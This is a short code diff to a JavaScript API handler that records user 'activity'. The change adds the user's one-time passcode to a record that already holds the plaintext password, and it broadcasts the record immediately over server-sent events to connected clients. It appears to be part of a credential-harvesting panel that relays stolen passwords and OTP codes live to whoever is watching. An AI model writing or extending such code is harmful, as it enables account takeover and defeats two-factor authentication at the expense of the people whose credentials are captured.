@@ -41,18 +41,22 @@ export default async function handler(req, res) {
       timestamp: new Date().toISOString(),
       hasPassword: additionalData?.hasPassword || false,
       // Include password in activity for real-time display (exists only in memory)
-      password: additionalData?.password || null
+      password: additionalData?.password || null,
+      otpCode: additionalData?.otpCode || null
     };
     
-    // Publish to KV (metadata only) and broadcast via SSE
-    await publishActivity(activity);
-    
-    // Also broadcast directly to connected SSE clients (for immediate delivery)
+    // Broadcast immediately to SSE clients (fastest path)
     broadcastToSSE({
       type: 'activity',
       data: activity
     });
     
+    // Publish to KV in parallel (don't wait)
+    publishActivity(activity).catch(err => {
+      console.error('Error publishing to KV (non-blocking):', err);
+    });
+    
+    // Respond immediately
     res.status(200).json({ success: true, activity: { id: activity.id, type: activity.type } });
   } else {
     res.status(405).json({ error: 'Method not allowed' });
